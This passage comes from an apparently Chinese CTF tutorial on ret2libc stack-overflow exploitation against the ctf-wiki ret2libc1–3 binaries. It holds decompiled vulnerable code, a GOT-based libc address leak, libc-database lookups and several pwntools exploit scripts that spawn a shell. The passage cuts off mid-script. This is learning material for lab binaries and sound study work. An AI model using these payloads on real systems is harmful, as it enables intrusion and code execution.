class="hljs-literal">Yes</span><br></code></pre></td></tr></table></figure>

<p>运行一下，啥也没有</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">RET2LIBC &gt;_&lt;<br><span class="hljs-number">114514</span><br>~<span class="hljs-symbol">$</span><br></code></pre></td></tr></table></figure>

<p>看一下源码，首先是<code>main</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);<br>  gets(s);		&lt;--<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到用了<code>gets</code>函数，是一个溢出点。可以通过IDA或者手动测量得出栈的长度，为112字节。</p>
<p>再看一下旁边的<code>secure</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">secure</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">time_t</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> input; <span class="hljs-comment">// [esp+18h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">int</span> secretcode; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v0 = time(<span class="hljs-number">0</span>);<br>  srand(v0);<br>  secretcode = rand();<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;input);<br>  <span class="hljs-keyword">if</span> ( input == secretcode )<br>    system(<span class="hljs-string">&quot;shell!?&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>逻辑简单来说就是以时间戳为种子，生成随机数，与用户输入的值相比较，如果相同，执行<code>system</code>函数。<br>而且<code>system</code>处于共享对象中，第一次调用函数时，会把函数真实的地址写入got表中，所以我们可以直接覆盖函数返回地址使其调用 system()@plt 模拟 system() 函数真实调用。IDA 中找到 system@plt 的地址</p>
<p>既然有了<code>system</code>函数，我们接下来找<code>/bin/sh</code>，既可以通过ropgadget找，也可以通过IDA找，最后其地址为<code>0x08048720</code></p>
<p>最后，我们构建如下exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="实例3"><a href="#实例3" class="headerlink" title="实例3"></a>实例3</h4><p>示例文件：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc2">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc2</a></p>
<p>查一下保护，NX保护，32位</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br><span class="hljs-attr">Debuginfo:</span>  <span class="hljs-literal">Yes</span><br></code></pre></td></tr></table></figure>

<p>运行一下，没啥特别</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Something surprise here, but I don<span class="hljs-comment">&#x27;t think it will work.</span><br>What <span class="hljs-keyword">do</span> you think ????<br></code></pre></td></tr></table></figure>

<p>看一下源码，<code>main</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What do you think ?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>有<code>gets</code>函数，有溢出点，栈长112字节</p>
<p>看一下<code>secure</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">secure</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">time_t</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> input; <span class="hljs-comment">// [esp+18h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">int</span> secretcode; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v0 = time(<span class="hljs-number">0</span>);<br>  srand(v0);<br>  secretcode = rand();<br>  __isoc99_scanf(&amp;unk_8048760, &amp;input);<br>  <span class="hljs-keyword">if</span> ( input == secretcode )<br>    system(<span class="hljs-string">&quot;no_shell_QQ&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>和上面一样，随机数，并且调用了<code>system</code>函数，并且在动态对象里，而且这是第一次调用，<code>system@plt</code>地址是<code>0x08048490</code></p>
<p>接下来我们找<code>/bin/sh</code>，但是，没有找到<code>/bin/sh</code>，但是，我们却在bss段内找到一个可利用空间。</p>
<p>那么我们就可以构建如下exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>bss_addr = <span class="hljs-number">0x0804A080</span><br>gets_plt = <span class="hljs-number">0x08048460</span><br>sys_plt  = <span class="hljs-number">0x08048490</span><br><br>io=process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;What do you think ?&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">112</span> + p32(gets_plt) + p32(sys_plt) + p32(bss_addr)+p32(bss_addr)<br>io.sendline(payload)<br>io.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p>payload解读：<br>首先使用112个A字符填充栈，使栈发生溢出，再用gets函数的plt地址来覆盖原返回地址，使程序流执行到gets函数，参数就是bss段的地址（bss段的变量），目的是为了使用gets函数将&#x2F;bin&#x2F;sh 写入到bss段中。接下来在使用systm函数覆盖gets函数的返回地址，使程序执行到system函数，其参数也是bss段中的内容，也就是&#x2F;bin&#x2F;sh。最后的io.sendline(‘&#x2F;bin&#x2F;sh’)是为了将bss段上变量的内容替换成&#x2F;bin&#x2F;sh（也就是说在执行sendline(‘&#x2F;bin&#x2F;sh’)之前，bss段上的变量未被初始化，其内容为空）。</p>
<p>至于为什么要写成payload &#x3D; ‘A’*112 + p32(gets_plt) + p32(sys_plt) + p32(bss_addr)+p32(bss_addr)，那是因为sys_plt要当作gets_plt的返回值。</p>
<h4 id="实例4"><a href="#实例4" class="headerlink" title="实例4"></a>实例4</h4><p>示例：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3</a></p>
<p>查一下保护，NX保护，32位</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br><span class="hljs-attr">Debuginfo:</span>  <span class="hljs-literal">Yes</span><br></code></pre></td></tr></table></figure>

<p>源码和上两个差不多，栈长112字节，与上两个不同的是，这次既没有<code>system</code>函数，也没有<code>/bin/sh</code>。</p>
<p>那我们现在的当务之急是找到<code>system</code>函数的地址，那我们应该如何得到呢？这里主要利用了两个知识点：</p>
<ul>
<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而 libc 在github上有人进行收集，如下<a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li>
</ul>
<p>所以我们只要得到libc的版本，就可以知道了system函数和&#x2F;bin&#x2F;sh的偏移量。知道偏移量后，再找到libc的基地址，就可以得到system函数的真实地址，就可以做我们想要做的事情了，我们可以通过一个公式来得到system的真实地址。</p>
<figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">libc基地址  +  函数偏移量   </span>=<span class="hljs-string">  函数真实地址</span><br></code></pre></td></tr></table></figure>

<p>举个例子：如计算<code>system</code>函数在内存空间中的函数地址：</p>
<ul>
<li>拿到__libc_start_main函数在内存空间中的地址addr_main</li>
<li>__libc_start_main函数相对于libc.so.6的起始地址是addr_a（前提是需要知道libc的版本）</li>
<li>system函数相对于libc.so.6的起始地址是addr_b</li>
<li>则system函数在内存中真正的地址为addr_main + addr_b - addr_a</li>
</ul>
<p>问题又来了，我们该如何泄露函数的真实地址的，这里涉及到了libc的延迟绑定技术，第一次调用时，发生如下过程</p>
<img src = "https://i-blog.csdnimg.cn/blog_migrate/ad67f17c70087b8151988d5e0ddc8fbe.png">

<p>第二次调用时，发生如下过程：</p>
<img src="https://i-blog.csdnimg.cn/blog_migrate/3110f76e0ccc12a6ab1f26904138b18c.png" srcset="/img/loading.gif" lazyload>

<p>我们要泄露函数的真实地址，一般的方法是采用got表泄露，因为只要之前执行过puts函数，got表里存放着就是函数的真实地址了，这里我用的是puts函数，因为程序里已经运行过了puts函数，真实地址已经存放到了got表内。我们得到puts函数的got地址后，可以把这个地址作为参数传递给puts函数，则会把这个地址里的数据，即puts函数的真实地址给输出出来，这样我们就得到了puts函数的真实地址。<br>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_got_addr = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<span class="hljs-comment">#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象</span><br>puts_plt_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<span class="hljs-comment">#puts的plt表的地址，我们需要利用puts函数泄露</span><br>main_plt_addr = elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<span class="hljs-comment">#返回地址被覆盖为main函数的地址。使程序还可被溢出</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_got_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_plt_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_plt_addr))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;main_plt_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(main_plt_addr))<br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>payload += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span><br>payload += p32(puts_plt_addr)<span class="hljs-comment">#覆盖返回地址为puts函数</span><br>payload += p32(main_plt_addr)<span class="hljs-comment">#这里是puts函数返回的地址。</span><br>payload += p32(puts_got_addr)<span class="hljs-comment">#这里是puts函数的参数</span><br><br>p.recv()<span class="hljs-comment">#接收程序一开始输出的一些信息</span><br>p.sendline(payload)<br><br>puts_addr = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<span class="hljs-comment">#将地址输出出来后再用332解包，此时就得到了puts函数的真实地址。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_addr))<br></code></pre></td></tr></table></figure>

<p>输出结果如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2libc3&#x27;</span>: pid 2997<br>[*] <span class="hljs-string">&#x27;/home/xyq/ret2libc3_/ret2libc3&#x27;</span><br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br>    Debuginfo:  Yes<br>puts_got_addr =  0x804a018<br>puts_plt_addr =  0x8048460<br>main_plt_addr =  0x80484d0<br>puts_addr =  0xea8692a0<br>[*] Stopped process <span class="hljs-string">&#x27;./ret2libc3&#x27;</span> (pid 2997)<br></code></pre></td></tr></table></figure>

<p>每一次运行时<code>puts_addr</code>的值都会发生改变，这是因为Linux系统开了ASLR（地址随机化）保护，但是它不会改变最低12位，因为需要内存对齐，在我的虚拟机上，<code>puts</code>函数的真实地址的最低12位为<code>2a0</code>，可以在<a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=__libc_start_main_ret%3Ae81">这个网站</a>上可以根据后十二位查到这个函数所在的libc的版本，我查到了7个版本，所以，这里我们用一个小工具<code>LibcSearcher</code>包</p>
<p>于是，我们对EXP做出如下修改：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_got_addr = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<span class="hljs-comment">#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象</span><br>puts_plt_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<span class="hljs-comment">#puts的plt表的地址，我们需要利用puts函数泄露</span><br>main_plt_addr = elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<span class="hljs-comment">#返回地址被覆盖为main函数的地址。使程序还可被溢出</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_got_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_plt_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_plt_addr))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;main_plt_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(main_plt_addr))<br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>payload += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span><br>payload += p32(puts_plt_addr)<span class="hljs-comment">#覆盖返回地址为puts函数</span><br>payload += p32(main_plt_addr)<span class="hljs-comment">#这里是puts函数返回的地址。</span><br>payload += p32(puts_got_addr)<span class="hljs-comment">#这里是puts函数的参数</span><br><br>p.recv()<span class="hljs-comment">#接收程序一开始输出的一些信息</span><br>p.sendline(payload)<br><br>puts_addr = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<span class="hljs-comment">#将地址输出出来后再用332解包，此时就得到了puts函数的真实地址。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>) <span class="hljs-comment">#libc基地址 = 函数真实地址 - 函数的偏移量</span><br>system_addr = libcbase + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span> + p32(system_addr) + p32(<span class="hljs-number">1234</span>) + p32(binsh_addr)<br><br>p.recv()<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>如果无法查询到libc库的信息，可以看看<a href = "https://blog.csdn.net/yongbaoii/article/details/113764938">这篇文章</a></p>
<p>输出如下结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bush">[*] Checking for new versions of pwntools<br>    To disable this functionality, set the contents of /home/xyq/.cache/.pwntools-cache-3.10/update to &#x27;never&#x27; (old way).<br>    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):<br>        [update]<br>        interval=never<br>[*] You have the latest version of Pwntools (4.13.1)<br>[+] Starting local process &#x27;./ret2libc3&#x27;: pid 2449<br>[*] &#x27;/home/xyq/ret2libc3_/ret2libc3&#x27;<br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br>    Debuginfo:  Yes<br>puts_got_addr =  0x804a018<br>puts_plt_addr =  0x8048460<br>main_plt_addr =  0x80484d0<br>puts_addr =  0xf29482a0<br>Multi Results:<br> 0: ubuntu-glibc (id libc6_2.35-0ubuntu3.8_i386)<br> 1: ubuntu-old-glibc (id libc6-x32_2.34-0ubuntu3_amd64)<br> 2: ubuntu-old-glibc (id libc6-x32_2.34-0ubuntu3_i386)<br>Please supply more info using <br>	add_condition(leaked_func, leaked_address).<br>You can choose it by hand<br>Or type &#x27;exit&#x27; to quit:exit<br>[*] Stopped process &#x27;./ret2libc3&#x27; (pid 2449)<br></code></pre></td></tr></table></figure>

<p>我们可以看到输出了三个<code>libc</code>库，一般来说，第一个，较新的<code>libc</code>库是这个程序所用的库。当然，也可以不在exp中导入<code>LibcSearcher</code>包，可以在得出<code>puts</code>函数的真实地址后，用<code>Libcseracher/libc-database</code>下的<code>find</code>程序来找到对应的库。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./find puts 2a0<br>ubuntu-glibc (libc6_2.35-0ubuntu3.8_i386)<br></code></pre></td></tr></table></figure>

<p>之后，我们需要用到该目录下的<code>dump</code>程序来差这个库的偏移</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf">./dump libc6_2.<span class="hljs-number">35</span>-<span class="hljs-number">0</span>ubuntu3.<span class="hljs-number">8</span>_i386<br>offset___libc_start_main_ret <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x21519<br>offset_system <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x00048170<br>offset_dup2 <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0010afb0<br>offset_read <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0010a170<br>offset_write <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0010a240<br>offset_str_bin_sh <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x1bd0d5<br>❯ ./dump libc6_2.<span class="hljs-number">35</span>-<span class="hljs-number">0</span>ubuntu3.<span class="hljs-number">8</span>_i386 puts<br>offset_puts <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x000732a0       //我们需要这个来找到libc库的基地址<br></code></pre></td></tr></table></figure>

<p>有了这些，我们就即可以构造完整的exp了（如果上一步用了<code>LibcSearcher</code>包，这一步就可以把相关代码注释掉了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_got_addr = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<span class="hljs-comment">#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象</span><br>puts_plt_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<span class="hljs-comment">#puts的plt表的地址，我们需要利用puts函数泄露</span><br>main_plt_addr = elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<span class="hljs-comment">#返回地址被覆盖为main函数的地址。使程序还可被溢出</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_got_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_plt_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_plt_addr))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;main_plt_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(main_plt_addr))<br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>payload += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span><br>payload += p32(puts_plt_addr)<span class="hljs-comment">#覆盖返回地址为puts函数</span><br>payload += p32(main_plt_addr)<span class="hljs-comment">#这里是puts函数返回的地址。</span><br>payload += p32(puts_got_addr)<span class="hljs-comment">#这里是puts函数的参数</span><br><br>p.recv()<span class="hljs-comment">#接收程序一开始输出的一些信息</span><br>p.sendline(payload)<br><br>puts_addr = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<span class="hljs-comment">#将地址输出出来后再用u32解包，此时就得到了puts函数的真实地址。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_addr = &quot;</span>,<span 